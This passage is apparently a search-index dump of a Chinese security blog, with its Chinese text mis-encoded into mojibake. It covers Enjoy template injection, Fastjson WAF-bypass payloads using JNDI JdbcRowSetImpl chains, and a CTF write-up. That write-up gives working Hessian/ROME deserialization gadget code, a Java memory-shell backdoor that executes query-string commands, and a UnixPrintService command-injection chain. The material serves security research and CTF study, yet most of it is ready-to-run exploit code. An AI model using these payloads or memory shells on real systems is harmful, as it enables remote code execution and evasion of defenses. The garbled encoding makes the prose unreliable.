= Engine.use(); engine.setDevMode(true); engine.setToClassPathSourceFactory(); Template template = engine.getTemplateByString(base); String result = template.renderToString(); return result;&#125; ç›´æ¥å›æ˜¾å¾ˆç®€å•ä¸éœ€è¦è®²äº†éƒ½ï¼Œå¾ˆå¸¸è§„payload 1base=#((java.beans.Beans::instantiate(null,&quot;javax.script.ScriptEngineManager&quot;)).getEngineByExtension(&quot;js&quot;).eval(&quot;var s = [3];s[0] = \\&quot;/bin/bash\\&quot;;s[1] =\\&quot;-c\\&quot;;s[2] = \\&quot;id\\&quot;;var p =java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\\&quot;GBK\\&quot;).useDelimiter(\\&quot;\\\\A\\&quot;);var result = sc.hasNext() ? sc.next() : \\&quot;\\&quot;;sc.close();result;&quot;)) æµ‹è¯•ä¸‹","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Enjoyæ¨¡æ¿","slug":"Enjoyæ¨¡æ¿","permalink":"https://y4tacker.github.io/tags/Enjoy%E6%A8%A1%E6%9D%BF/"}]},{"title":"æµ…è°ˆFastjsonç»•waf","slug":"year/2022/3/æµ…è°ˆFastjsonç»•waf","date":"2022-03-30T06:36:29.000Z","updated":"2024-08-04T09:01:49.203Z","comments":true,"path":"2022/03/30/year/2022/3/æµ…è°ˆFastjsonç»•waf/","link":"","permalink":"https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/","excerpt":"","text":"æµ…è°ˆFastjsonç»•wafå†™åœ¨å‰é¢â€‹ å…³é”®æ—¶æœŸæ¢ä¸ªå£å‘³ï¼Œè™½ç„¶æ˜¯ç‚’é™ˆé¥­ï¼Œä½†ä¸ªäººè®¤ä¸ºæœ‰å¹²è´§çš„æ…¢æ…¢çœ‹ï¼Œä»æœ€ç®€å•åˆ°ä¸€äº›ä¸ªäººè®¤ä¸ºæ¯”è¾ƒéªšçš„ï¼Œæœ¬äººåƒåœ¾ä»£ç ç‹—ï¼Œæ²¡æœ‰å®æˆ˜ç»éªŒï¼Œå› è€Œæ›´å¤šæ˜¯ä»fastjsonçš„è¯æ³•è§£æéƒ¨åˆ†æ„é€ æ··æ·† åˆçº§ç¯‡æ·»åŠ ç©ºç™½å­—ç¬¦åœ¨com.alibaba.fastjson.parser.JSONLexerBase#skipWhitespace 12345678910111213141516171819public final void skipWhitespace() &#123; while(true) &#123; while(true) &#123; if (this.ch &lt;= &#x27;/&#x27;) &#123; if (this.ch == &#x27; &#x27; || this.ch == &#x27;\\r&#x27; || this.ch == &#x27;\\n&#x27; || this.ch == &#x27;\\t&#x27; || this.ch == &#x27;\\f&#x27; || this.ch == &#x27;\\b&#x27;) &#123; this.next(); continue; &#125; if (this.ch == &#x27;/&#x27;) &#123; this.skipComment(); continue; &#125; &#125; return; &#125; &#125; &#125; ä¸éš¾çœ‹å‡ºé»˜è®¤ä¼šå»é™¤é”®ã€å€¼å¤–çš„ç©ºæ ¼ã€\\bã€\\nã€\\rã€\\fç­‰ï¼Œä½œä¸ºå¼€èƒƒèœ é»˜è®¤å¼€å¯çš„Featureä¸­å¾—åˆ°çš„æ€è·¯æ·»åŠ å¤šä¸ªé€—å·FastJsonä¸­æœ‰ä¸ªé»˜è®¤çš„Featureæ˜¯å¼€å¯çš„AllowArbitraryCommasï¼Œè¿™å…è®¸æˆ‘ä»¬ç”¨å¤šä¸ªé€—å· è¿™é‡Œå¯ä»¥æ·»åŠ çš„ä½ç½®å¾ˆå¤š 1&#123;,,,,,,&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,,,,,,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;,,,,,, &quot;autoCommit&quot;:true&#125; jsonå­—æ®µåä¸è¢«å¼•å·åŒ…æ‹¬ä¹Ÿæ˜¯ä¸€ä¸ªé»˜è®¤å¼€å¯çš„Featureï¼ŒAllowUnQuotedFieldNamesï¼Œä½†æ˜¯åªåœ¨æ¢å¤å­—æ®µçš„è¿‡ç¨‹è°ƒç”¨å½“ä¸­æœ‰æ•ˆæœ å› æ­¤åŸæ¥çš„payloadå¯ä»¥åšæ­¤æ”¹é€  1234&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;||\\/&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,dataSourceName:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; jsonå­—æ®µåä½¿â½¤å•å¼•å·åŒ…è£¹Feature.AllowSingleQuoteä¹Ÿæ˜¯é»˜è®¤å¼€å¯æ»´ï¼Œè¿™ä¸ªå¤ªç®€å•äº†å°±ä¸è¯´äº† @typeåçš„å€¼ç¬¬ä¸€ä¸ªå¼•å·å¯ä»¥æ›¿æ¢ä¸ºå…¶ä»–å­—ç¬¦ä¸»è¦æ˜¯ä¸€ä¸ªé€»è¾‘é—®é¢˜ è¿™é‡Œæˆ‘ä»¬å¯ä»¥å¯¹æ¯”ä¹‹å‰è·å–@typeçš„è¿‡ç¨‹ï¼Œå…ˆæ£€éªŒäº†å½“å‰ä½ç½®æ˜¯&quot;å†æ‰«æåˆ°ä¸‹ä¸€ä¸ª&quot;ä¹‹é—´çš„å€¼ 123456if (ch == &#x27;&quot;&#x27;) &#123; key = lexer.scanSymbol(this.symbolTable, &#x27;&quot;&#x27;); lexer.skipWhitespace(); ch = lexer.getCurrent();//çœç•¥ä¸å¿…è¦ä»£ç &#125; å› æ­¤å¯ä»¥æ„é€ å‡º,æ³¨æ„comå‰é¢çš„å¼•å·è¢«æˆ‘æ”¹äº†,&#123;&quot;@type&quot;:xcom.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; ç¼–ç ç»•è¿‡(Unicode/Hex)é¦–å…ˆåœ¨com.alibaba.fastjson.parser.JSONLexerBase#scanSymbol,å½“ä¸­å¯ä»¥çœ‹è§ï¼Œå¦‚æœé‡åˆ°äº†\\uæˆ–è€…\\xä¼šæœ‰è§£ç æ“ä½œ è¿˜å¯ä»¥æ··åˆç¼–ç ï¼Œè¿™é‡Œä¸€æ­¥åˆ°ä½ 1&#123;&quot;\\x40\\u0074\\u0079\\u0070\\u0065&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; å¯¹å­—æ®µæ·»åŠ å¤šä¸ªä¸‹åˆ’çº¿æˆ–è€…å‡å·1.2.36ç‰ˆæœ¬å‰åœ¨com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#parseField è§£æå­—æ®µçš„keyçš„æ—¶å€™ï¼Œè°ƒç”¨äº†smartMatchï¼Œä¸‹é¢æˆªäº†ä¸æœ¬ä¸»é¢˜ç›¸å…³çš„å…³é”®ç‚¹ ç”±äºè¿™é‡Œæœ‰breakï¼Œä¸æ”¯æŒä¸¤ä¸ªä¸€èµ·æ··åˆä½¿ç”¨ï¼Œåªèƒ½å•ä¸€ä½¿ç”¨å…¶ä¸­ä¸€ä¸ªï¼Œéšä¾¿åŠ  1&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&#x27;d_a_t_aSourceName&#x27;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; 1.2.36ç‰ˆæœ¬åŠä»¥åæˆ‘ä»¬å†æ¥çœ‹è¿™ä¸ªsmartMatchè°ƒç”¨äº†com.alibaba.fastjson.util.TypeUtils#fnv1a_64_lower è¿™ä¸ªå‡½æ•°å¿½ç•¥æ‰€æœ‰çš„_ä¸- å› æ­¤ç®€å•æµ‹è¯•ï¼Œlol 1.2.36ç‰ˆæœ¬åå¯ä»¥å¯¹å±æ€§å‰æ·»åŠ isåœ¨é‚£ä¸ªåŸºç¡€ä¸Š,è¿˜æ˜¯åœ¨smartMatchå½“ä¸­å¯ä»¥çœ‹è§ï¼Œå¦‚æœå‰ç¼€æœ‰isï¼Œä¼šå»æ‰is 1&#123;&quot;a&quot;: &#123;&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,&quot;b&quot;: &#123;&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;isdataSourceName&quot;: &quot;rmi://127.0.0.1:1099/Exploit&quot;,&quot;isautoCommit&quot;: true&#125;&#125; é«˜çº§ç¯‡è‡ªå·±çæƒ³å‡ºæ¥çš„å“ˆå“ˆå“ˆï¼Œå‡è£…å¾ˆé«˜çº§å§ æ³¨é‡ŠåŠ å¼ºç‰ˆç»•è¿‡æˆ‘åœ¨æƒ³å¦‚æœå‡å¦‚æœ‰wafé€»è¾‘ä¼šä¸ºäº†æ–¹ä¾¿å…ˆå°†æ¥å—åˆ°çš„å­—ç¬¦ä¸²çš„å»é™¤æ³¨é‡Šç¬¦ä¹‹é—´çš„éƒ¨åˆ†å†å»åŒ¹é…ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¼ªä»£ç  1preg_replace(&quot;(/\\*(.*?)\\*/)&quot;,&quot;&quot;,&#x27;/*y4tacker*/&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;&#x27;); å¤„ç†å‰ï¼š/*y4tacker*/&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125; å¤„ç†åä¼šæ˜¾å¾—æ›´å¹²è„†æ›´å¥½åšåˆ¤æ–­ï¼š &#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125; é‚£æœ‰æ²¡æœ‰åŠæ³•å¯ä»¥è®©æˆ‘ä»¬å°†æ³¨é‡Šç¬¦ä¸­å†…å®¹æ›¿æ¢ä»¥åï¼Œæ²¡æœ‰å±é™©å­—ç¬¦å˜ï¼Œå½“ç„¶æœ‰çš„ï¼Œå…ˆç»™å‡ºç­”æ¡ˆå†è§£é‡ŠåŠ ä¸Š\\u001a /*\\u001a&#123;/*y4tacker*/&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/Exploit&quot;, &quot;autoCommit&quot;:true&#125;*/ï¼Œè¿™æ ·wafå°±ä¼šå°†å†…å®¹æ›¿æ¢åè¯†åˆ«ä¸€ä¸²ç©ºå­—ç¬¦å½“ç„¶å°±å¯ä»¥ç»•è¿‡ï¼Œè€Œä¸”JSONæ•°æ®åâ¾¯å¯ä»¥å¡«å……å…¶ä»–ä¸æ˜¯():[]&#123;&#125;ç­‰ä»»æ„å­—ç¬¦ï¼Œå…·ä½“å¯ä»¥çœ‹com.alibaba.fastjson.parser.JSONLexerBase#nextToken() é‚£ä¸ºä»€ä¹ˆè¿™é‡Œ\\u001aå¯ä»¥ç»•è¿‡ ä»ä»£ç å‡ºå‘å¼€å±€åˆå§‹åŒ–DefaultJSONParserçš„æ—¶å€™ï¼Œç”±äºæˆ‘ä»¬å­—ç¬¦ä¸²å¼€å¤´æ˜¯/ï¼Œä¼šè°ƒç”¨netToken è¿™é‡Œä¼šè°ƒç”¨skipCommentå»é™¤æ³¨é‡Š å¯ä»¥çœ‹è§å¦‚æœæ˜¯æ­£å¸¸é€»è¾‘åŒ¹é…åˆ°*/åªæ˜¯ç§»åŠ¨åˆ°ä¸‹ä¸€å­—ç¬¦è¿”å› ä¹‹åç»§ç»­å¤„ç†æ­£å¸¸é€»è¾‘ é¢˜å¤–è¯fastjsonçœ¼ä¸­çš„æ³¨é‡Š/**/ï¼Œ//y4tacker\\nï¼Œå…·ä½“å¯ä»¥çœ‹skipCommentçš„é€»è¾‘ å› æ­¤åœ¨æ”¯æŒåŠ æ³¨é‡Šçš„åœ°æ–¹å¯ä»¥è¯•è¯•æ·»åŠ æ‰“ä¹±ç‰¹å¾ 1//y4tacker\\n&#123;//y4tacker\\n&quot;@type&quot;//y4tacker\\n://y4tacker\\n&quot;com.test.Test&quot;//y4tacker\\n&#125;","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"Fastjson","slug":"Fastjson","permalink":"https://y4tacker.github.io/tags/Fastjson/"}]},{"title":"2022è™ç¬¦CTF-Javaéƒ¨åˆ†","slug":"year/2022/3/2022è™ç¬¦CTF-Javaéƒ¨åˆ†","date":"2022-03-21T03:00:58.000Z","updated":"2024-08-04T09:01:49.183Z","comments":true,"path":"2022/03/21/year/2022/3/2022è™ç¬¦CTF-Javaéƒ¨åˆ†/","link":"","permalink":"https://y4tacker.github.io/2022/03/21/year/2022/3/2022%E8%99%8E%E7%AC%A6CTF-Java%E9%83%A8%E5%88%86/","excerpt":"","text":"2022è™ç¬¦CTF-Javaéƒ¨åˆ†å†™åœ¨å‰é¢â€‹ éå°ç™½æ–‡ï¼Œä»£ç åŸºäºmarshalsecé¡¹ç›®åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ æ­£æ–‡â€‹ æœ¬èº«æˆ‘æ˜¯ä¸å¤ªæ‡‚hessiançš„ååºåˆ—åŒ–ï¼Œå¤§æ¦‚å»ç½‘ä¸Šæœäº†ä¸€ä¸‹é…åˆROMEåˆ©ç”¨çš„æ€è·¯ï¼ˆå¦‚æœååºåˆ—åŒ–mapå¯¹è±¡ï¼Œåœ¨é€»è¾‘åé¢é€šè¿‡putæ“ä½œï¼Œä»è€Œè§¦å‘å¯¹keyè°ƒç”¨hashCodeæ‰“ROMEï¼‰ï¼Œè¿™é‡Œä¸æ¸…æ¥šå¯ä»¥çœ‹çœ‹ROMEåˆ©ç”¨é“¾ä»¥åŠhessianååºåˆ—åŒ–çš„ä¸€äº›ç®€å•ä¸œè¥¿ â€‹ é¦–å…ˆç®€å•çœ‹ä¸‹dockerï¼Œå¯ä»¥çœ‹åˆ°ä¼šå¯¼è‡´ä¸èƒ½å‡ºç½‘ 123456789101112131415161718192021222324252627version: &#x27;2.4&#x27;services: nginx: image: nginx:1.15 ports: - &quot;0.0.0.0:8090:80&quot; restart: always volumes: - ./nginx.conf:/etc/nginx/conf.d/default.conf:ro networks: - internal_network - out_network web: build: ./ restart: always volumes: - ./flag:/flag:ro networks: - internal_networknetworks: internal_network: internal: true ipam: driver: default out_network: ipam: driver: default nginx.conf 12345678910111213141516171819server &#123; listen 80; server_name localhost; location / &#123; root /usr/share/nginx/html; index index.html index.htm; proxy_pass http://web:8090; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root /usr/share/nginx/html; &#125;&#125; åˆ©ç”¨ä¸€ï¼šSignedObjectå®ç°äºŒæ¬¡ååºåˆ—åŒ–æ—¢ç„¶ä¸å‡ºç½‘é‚£å°±æ— æ³•é…åˆJNDIå»åˆ©ç”¨äº†ï¼ˆç½‘ä¸Šä¸»æµçš„åˆ©ç”¨ï¼‰ï¼Œåé¢å°è¯•äº†TemplatesImplï¼Œåœ¨Hessiançš„ä¸€äº›é™åˆ¶ä¸‹(æœ‰ç©ºè‡ªå·±å»çœ‹æºç )ï¼Œå¯¼è‡´è¢«transientä¿®é¥°çš„_tfactoryå¯¹è±¡æ— æ³•å†™å…¥é€ æˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼Œä¸ºä»€ä¹ˆå‘¢,è‡ªå·±çœ‹å›¾å¯ä»¥çœ‹åˆ°ä¸ä»…ä»…æ˜¯è¢«transientä¿®é¥°ï¼ŒåŒæ—¶é™æ€å˜é‡ä¹Ÿä¸è¡Œï¼Œè¿™é‡Œå¯¼è‡´å¦ä¸€ä¸ªåˆ©ç”¨é“¾ä¸èƒ½æ‰“ï¼Œè¿™é‡Œä¸æ ä¹‹åè§£å†³æ€è·¯å°±æ˜¯æ‰¾ä¸ªäºŒæ¬¡ååºåˆ—åŒ–çš„ç‚¹è§¦å‘åŸç”Ÿååºåˆ—åŒ–å³å¯ï¼Œæœ€åæ‰¾åˆ°ä¸ªjava.security.SignedObject#SignedObject,é‡Œé¢çš„getObjectå¯ä»¥è§¦å‘ 1234567891011public Object getObject() throws IOException, ClassNotFoundException&#123; // creating a stream pipe-line, from b to a ByteArrayInputStream b = new ByteArrayInputStream(this.content); ObjectInput a = new ObjectInputStream(b); Object obj = a.readObject(); b.close(); a.close(); return obj;&#125; è¿™æ—¶å€™èªæ˜çš„ä½ ä¸€å®šæƒ³é—®ï¼Œä¸ºä»€ä¹ˆåŸç”Ÿååºåˆ—åŒ–å°±å¯ä»¥æ¢å¤è¿™ä¸ªtrasientä¿®é¥°çš„å˜é‡å‘¢ï¼Œç­”æ¡ˆå¦‚ä¸‹com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#readObject,é‡å†™äº†readOBjectæ–¹æ³• å› æ­¤å¾—åˆ°ä¸‹é¢ç®€å•çš„payloadï¼Œä¸‹é¢payloadæœ‰ä¸€äº›åœ°æ–¹è¿˜å¯ä»¥å®Œå–„å˜å¾—æ›´å¥½ï¼Œä½†æ˜¯æˆ‘æ‡’ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859package marshalsec;import com.caucho.hessian.io.Hessian2Input;import com.caucho.hessian.io.Hessian2Output;import com.rometools.rome.feed.impl.EqualsBean;import com.rometools.rome.feed.impl.ObjectBean;import com.rometools.rome.feed.impl.ToStringBean;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import marshalsec.gadgets.JDKUtil;import javax.management.BadAttributeValueExpException;import javax.xml.transform.Templates;import java.io.*;import java.lang.reflect.Field;import java.security.*;import java.util.Base64;import java.util.HashMap;import static marshalsec.util.Reflections.setFieldValue;public class Test &#123; public static void main(String[] args) throws Exception &#123; byte[] code = ClassPool.getDefault().get(&quot;Yyds&quot;).toBytecode(); TemplatesImpl templates = new TemplatesImpl(); setFieldValue(templates,&quot;_name&quot;,&quot;abc&quot;); setFieldValue(templates,&quot;_class&quot;,null); setFieldValue(templates,&quot;_tfactory&quot;,new TransformerFactoryImpl()); setFieldValue(templates,&quot;_bytecodes&quot;,new byte[][]&#123;code&#125;); ToStringBean bean = new ToStringBean(Templates.class,templates); BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1); setFieldValue(badAttributeValueExpException,&quot;val&quot;,bean); KeyPairGenerator keyPairGenerator; keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;); keyPairGenerator.initialize(1024); KeyPair keyPair = keyPairGenerator.genKeyPair(); PrivateKey privateKey = keyPair.getPrivate(); Signature signingEngine = Signature.getInstance(&quot;DSA&quot;); SignedObject so = null; so = new SignedObject(badAttributeValueExpException, privateKey, signingEngine); ObjectBean delegate = new ObjectBean(SignedObject.class, so); ObjectBean root = new ObjectBean(ObjectBean.class, delegate); HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root); ByteArrayOutputStream os = new ByteArrayOutputStream(); Hessian2Output output = new Hessian2Output(os); output.writeObject(map); output.getBytesOutputStream().flush(); output.completeMessage(); output.close(); System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); &#125;&#125; è¿™æ ·å°±å¯ä»¥å®ç°æ‰§è¡Œååºåˆ—åŒ–æ‰“TemplatesImplåŠ è½½æ¶æ„ä»£ç äº†ï¼Œæ¥ä¸‹æ¥æ—¢ç„¶ä¸å‡ºç½‘ï¼Œæ¯”è¾ƒæ–¹ä¾¿çš„å°±æ˜¯å»æ³¨å…¥å†…å­˜é©¬ æŒ‰ç…§ç»éªŒæ¥è®²Webä¸­é—´ä»¶æ˜¯å¤šçº¿ç¨‹çš„åº”ç”¨ï¼Œä¸€èˆ¬requstå¯¹è±¡éƒ½ä¼šå­˜å‚¨åœ¨çº¿ç¨‹å¯¹è±¡ä¸­ï¼Œå¯ä»¥é€šè¿‡Thread.currentThread()æˆ–Thread.getThreads()è·å–ï¼ŒæŒ‰ç…§è¿™ä¸ªæ€è·¯å†™å°±è¡Œäº† æˆ‘æ˜¯æ‡’ç‹—ä¹‹é—´æš´åŠ›æ›¿æ¢handler(ç»§æ‰¿AbstractTransletå®ç°HttpHandler)ï¼Œå«Œå¼ƒéº»çƒ¦å¯ä»¥è‡ªå·±åŠ è·¯ç”±å¯ä»¥è®©ä»£ç æ›´çŸ­ï¼Œè¿˜å¯ä»¥æ”¾åˆ°é™æ€å—é˜²æ­¢è§¦å‘ä¸¤æ¬¡ï¼Œä¸€å¥è¯æˆ‘æ‡’è‡ªå·±æ”¹å» 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091import com.sun.net.httpserver.HttpContext;import com.sun.net.httpserver.HttpExchange;import com.sun.net.httpserver.HttpHandler;import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import java.io.*;import java.lang.reflect.Field;public class Yyds extends AbstractTranslet implements HttpHandler &#123; public void handle(HttpExchange t) throws IOException &#123; String response = &quot;Y4tacker&#x27;s MemoryShell&quot;; String query = t.getRequestURI().getQuery(); String[] var3 = query.split(&quot;=&quot;); System.out.println(var3[0]+var3[1]); ByteArrayOutputStream output = null; if (var3[0].equals(&quot;y4tacker&quot;))&#123; InputStream inputStream = Runtime.getRuntime().exec(var3[1]).getInputStream(); output = new ByteArrayOutputStream(); byte[] buffer = new byte[4096]; int n = 0; while (-1 != (n = inputStream.read(buffer))) &#123; output.write(buffer, 0, n); &#125; &#125; response+=(&quot;\\n&quot;+new String(output.toByteArray())); t.sendResponseHeaders(200, (long)response.length()); OutputStream os = t.getResponseBody(); os.write(response.getBytes()); os.close(); &#125; public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; public Yyds() throws Exception &#123; super(); try&#123; Object obj = Thread.currentThread(); Field field = obj.getClass().getDeclaredField(&quot;group&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;threads&quot;); field.setAccessible(true); obj = field.get(obj); Thread[] threads = (Thread[]) obj; for (Thread thread : threads) &#123; if (thread.getName().contains(&quot;Thread-2&quot;)) &#123; try &#123; field = thread.getClass().getDeclaredField(&quot;target&quot;); field.setAccessible(true); obj = field.get(thread); System.out.println(obj); field = obj.getClass().getDeclaredField(&quot;this$0&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;contexts&quot;); field.setAccessible(true); obj = field.get(obj); field = obj.getClass().getDeclaredField(&quot;list&quot;); field.setAccessible(true); obj = field.get(obj); java.util.LinkedList lt = (java.util.LinkedList)obj; Object o = lt.get(0); field = o.getClass().getDeclaredField(&quot;handler&quot;); field.setAccessible(true); field.set(o,this); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125; &#125;catch (Exception e)&#123; &#125; &#125;&#125; å…¶å®å¯ä»¥å»é™æ€å—æ”¹ä¸€ä¸‹ï¼Œä¸ç„¶æ‰§è¡Œä¸¤æ¬¡å¤šå¤šå°‘å°‘æœ‰ç‚¹çƒ¦ï¼Œå°±è¿™æ ·äº†so easy å½“ç„¶å¤ªæš´åŠ›äº†ä¹Ÿä¸å¥½å“ˆå“ˆå“ˆï¼Œè¿˜å¯ä»¥åœ¨ä¸Šé¢çš„sun.net.httpserver.ServerImpl$Dispatcherç›´æ¥æ‰§è¡Œsun.net.httpserver.ServerImpl#createContext(java.lang.String, com.sun.net.httpserver.HttpHandler)åˆ›å»ºæ–°çš„è·¯ç”±å³å¯ è¿™é‡Œå°±ä¸å†™äº†ï¼Œä¸€ä¸ªå­—æ‡’ï¼Œåæ­£ä¹Ÿä¸éš¾ å®ç°æ•ˆæœ åˆ©ç”¨äºŒï¼šUnixPrintServiceç›´æ¥æ‰§è¡Œå‘½ä»¤ä¹‹å‰ä¸æ¸…æ¥šï¼Œåé¢@wuyxå¸ˆå‚…æé†’æˆ‘æ‰å‘ç°å¯ä»¥ä¸ç”¨å®ç°åºåˆ—åŒ–æ¥å£ï¼Œå…·ä½“å¯ä»¥å‚è€ƒmarshalsecçš„å®ç° 123HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();sf.setAllowNonSerializable(true);output.setSerializerFactory(sf); åœ¨sun.print.UnixPrintServiceçš„æ‰€æœ‰getæ–¹æ³•éƒ½èƒ½è§¦å‘ï¼Œåˆ«çœ‹è¿™ä¸ªæ˜¯Unixå…¶å®linuxä¹Ÿæœ‰ï¼Œåœ¨é«˜ç‰ˆæœ¬è¢«ç§»é™¤(æœ‰å…´è¶£è‡ªå·±è€ƒå¤)ï¼Œåˆ©ç”¨æ–¹å¼å°±æ˜¯ç®€å•å‘½ä»¤æ‹¼æ¥æ‰§è¡Œï¼ˆç¼ºç‚¹å°±æ˜¯å¤ªèƒ½å¼¹äº†ï¼ŒåŸºæœ¬ä¸Šæ¯ä¸ªgetæ–¹æ³•éƒ½èƒ½å¼¹ï¼‰ å®ƒä¼šå»æ‰¾publicä¿®é¥°çš„getteræ–¹æ³•ï¼Œè€Œä¸ºä»€ä¹ˆä¼šè°ƒç”¨å“ªä¸ªç§æœ‰æ–¹æ³•å…¶å®ä¹Ÿå¾ˆç®€å•æ¯”å¦‚è¯´getAttributesé‡Œé¢å°±è°ƒç”¨äº†è¿™äº›è§¦å‘å‘½ä»¤æ‰§è¡Œçš„ç§æœ‰æ–¹æ³• 1234567891011121314151617public PrintServiceAttributeSet getAttributes() &#123; HashPrintServiceAttributeSet var1 = new HashPrintServiceAttributeSet(); var1.add(this.getPrinterName()); var1.add(this.getPrinterIsAcceptingJobs()); PrinterState var2 = this.getPrinterState(); if (var2 != null) &#123; var1.add(var2); &#125; PrinterStateReasons var3 = this.getPrinterStateReasons(); if (var3 != null) &#123; var1.add(var3); &#125; var1.add(this.getQueuedJobCount()); return AttributeSetUtilities.unmodifiableView(var1);&#125; 12345678910111213141516171819Constructor&lt;UnixPrintService&gt; declaredConstructor = UnixPrintService.class.getDeclaredConstructor(String.class);declaredConstructor.setAccessible(true);ObjectBean delegate = new ObjectBean(sun.print.UnixPrintService.class,declaredConstructor.newInstance(&quot;;open -na Calculator&quot;));ObjectBean root = new ObjectBean(ObjectBean.class, delegate);HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);//ByteArrayOutputStream os = new ByteArrayOutputStream();Hessian2Output output = new Hessian2Output(os);HessianBase.NoWriteReplaceSerializerFactory sf = new HessianBase.NoWriteReplaceSerializerFactory();sf.setAllowNonSerializable(true);output.setSerializerFactory(sf);output.writeObject(map);output.getBytesOutputStream().flush();output.completeMessage();output.close();System.out.println(new String(Base64.getEncoder().encode(os.toByteArray()))); æ‹¿flagçš„è¯å°±ä¸¤ç§æ–¹å¼JavaAgentæ³¨å…¥å†…å­˜é©¬ï¼Œæˆ–è€…æœ¬æ¥å°±æ˜¯ctf 1if [ `cut -c 1 flag` = &quot;a&quot; ];then sleep 2;fi å¦‚ä½•å¿«é€Ÿæ‹¿åˆ©ç”¨é“¾åœ¨è¿™æ¬¡æ¯”èµ›åæˆ‘ç®€å•å­¦ä¹ äº†ä¸‹ç”¨tabbyï¼Œé€šè¿‡ä¸‹é¢çš„neo4jæŸ¥è¯¢è¯­å¥ï¼Œä¹‹åäººå·¥æ’æŸ¥ä¸‹ 1match path=(m1:Method)-[:CALL*..3]-&gt;(m2:Method &#123;&#125;) where m1.NAME =~ &quot;get.*&quot; and m1.PARAMETER_SIZE=0 and (m2.NAME =~ &quot;exec.*&quot; or m2.NAME =~ &quot;readObject&quot;) return path åˆ©ç”¨ä¸€ï¼š åˆ©ç”¨äºŒï¼š æ€»çš„æ¥è¯´è¿˜æ˜¯å­¦çš„æŒºå¤šï¼ŒæŒºæœ‰æ”¶è·çš„ä¸€ä¸ªæ¯”èµ›","categories":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/categories/Java/"}],"tags":[{"name":"Java","slug":"Java","permalink":"https://y4tacker.github.io/tags/Java/"},{"name":"ååºåˆ—åŒ–","slug":"ååºåˆ—åŒ–","permalink":"https://y4tacker.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"}]},{"title":"ROMEæ”¹é€ è®¡åˆ’","slug":"year/2022/3/ROMEæ”¹é€ è®¡åˆ’","date":"2022-03-07T12:00:56.000Z","updated":"2024-08-04T09:01:49.192Z","comments":true,"path":"2022/03/07/year/2022/3/ROMEæ”¹é€ è®¡åˆ’/","link":"","permalink":"https://y4tacker.github.io/2022/03/07/year/2022/3/ROME%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92/","excerpt":"","text":"ROMEæ”¹é€ 